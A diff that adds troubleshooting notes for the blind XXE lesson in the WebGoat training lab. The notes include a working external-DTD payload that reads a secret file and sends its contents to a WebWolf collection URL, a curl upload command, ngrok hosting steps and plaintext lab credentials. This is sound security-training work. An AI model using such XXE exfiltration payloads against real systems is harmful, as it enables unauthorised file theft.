@@ -1,0 +1,112 @@
+====================================================================
+XXE BLIND - NETWORK ARCHITECTURE FIX
+====================================================================
+
+PROBLEM IDENTIFIED:
+-------------------
+WebGoat server is at: 192.168.254.112:8001 (REMOTE machine)
+Your local machine: 127.0.0.1 (LOCAL machine)
+Python server: 127.0.0.1:8003 (LOCAL - not accessible from remote!)
+
+The remote WebGoat server CANNOT access files on your local machine!
+
+====================================================================
+SOLUTION OPTIONS:
+====================================================================
+
+OPTION 1: Use WebWolf on the REMOTE Machine
+--------------------------------------------
+WebWolf should be accessible from the WebGoat server.
+Try uploading DTD to the REMOTE WebWolf instance:
+
+Remote WebWolf: http://192.168.254.112:8002/WebWolf
+
+Steps:
+1. Open: http://192.168.254.112:8002/WebWolf
+2. Login with: nooniman / nooniman
+3. Upload attack.dtd via the web interface
+4. DTD will be at: http://192.168.254.112:8002/files/nooniman/attack.dtd
+
+Updated attack.dtd content for REMOTE:
+<!ENTITY % file SYSTEM "file:///C:/Users/mahad/.webgoat-2025.3/XXE/nooniman/secret.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.254.112:8002/WebWolf/landing?secret=%file;'>">
+%eval;
+%exfil;
+
+Updated XXE payload:
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "http://192.168.254.112:8002/files/nooniman/attack.dtd">
+  %remote;
+]>
+<comment><text>Blind XXE Attack</text></comment>
+
+Then check WebWolf incoming requests at:
+http://192.168.254.112:8002/WebWolf
+
+
+OPTION 2: Use curl to Upload DTD to Remote WebWolf
+---------------------------------------------------
+curl.exe -X POST `
+  -F "file=@c:\webgoat-scripts-1\attack.dtd" `
+  http://192.168.254.112:8002/WebWolf/fileupload
+
+
+OPTION 3: WebGoat's Built-in DTD Hosting
+-----------------------------------------
+Some WebGoat versions have a built-in way to host DTD files.
+Check if WebGoat has a file upload or hosting feature.
+
+
+OPTION 4: Host DTD on Public Server (ngrok, etc)
+-------------------------------------------------
+If you have ngrok or similar:
+1. ngrok http 8003
+2. Use the public URL in your XXE payload
+3. Keep Python server running
+
+====================================================================
+RECOMMENDED APPROACH:
+====================================================================
+
+1. First, check if WebWolf is running on the REMOTE machine:
+   Open: http://192.168.254.112:8002/WebWolf
+
+2. If accessible, upload attack.dtd there using web interface
+
+3. Update attack.dtd to use REMOTE WebWolf URL:
+   Change: http://127.0.0.1:8002/WebWolf/landing
+   To: http://192.168.254.112:8002/WebWolf/landing
+   OR use: http://localhost:8002/WebWolf/landing
+   (localhost from WebGoat's perspective)
+
+4. Send XXE attack using REMOTE DTD URL:
+   http://192.168.254.112:8002/files/nooniman/attack.dtd
+
+5. Check incoming requests at REMOTE WebWolf:
+   http://192.168.254.112:8002/WebWolf
+
+====================================================================
+NETWORK DIAGRAM:
+====================================================================
+
+YOUR BROWSER (127.0.0.1)
+    |
+    | [1] HTTP POST with XXE payload
+    v
+WEBGOAT SERVER (192.168.254.112:8001)
+    |
+    | [2] Fetches DTD from
+    v
+WEBWOLF FILE SERVER (192.168.254.112:8002/files/...)
+    |
+    | [3] DTD reads secret.txt on WebGoat server
+    | [4] DTD sends secret to
+    v
+WEBWOLF LANDING (192.168.254.112:8002/WebWolf/landing)
+    ^
+    |
+    | [5] You check incoming requests
+YOUR BROWSER (127.0.0.1)
+
+====================================================================
